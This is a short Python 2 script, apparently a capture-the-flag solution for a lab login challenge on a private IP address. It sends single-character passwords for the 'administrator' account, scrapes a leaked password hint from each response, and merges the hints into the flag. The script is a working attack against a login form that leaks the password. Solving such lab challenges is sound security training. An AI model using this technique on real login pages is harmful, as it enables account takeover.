```python
#!/usr/bin/env python2

import re
import requests

passwords = []

def get_password_from_content(content):
    return content.split("find your password: ")[1].split("<")[0]

for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_+!{}":
    result = requests.post("http://192.168.40.8/PW/challenge11/login.php", data={
            'username': 'administrator',
            'password': character
        })

    passwords.append(get_password_from_content(result.content))

flag = ""

for password in passwords:
    if flag == "":
        flag = password

    else:
        for i, char in enumerate(password):
            if str(flag[i]) == "_":
                flag_list = list(flag)
                flag_list[i] = char
                flag = "".join(flag_list)

print flag
```
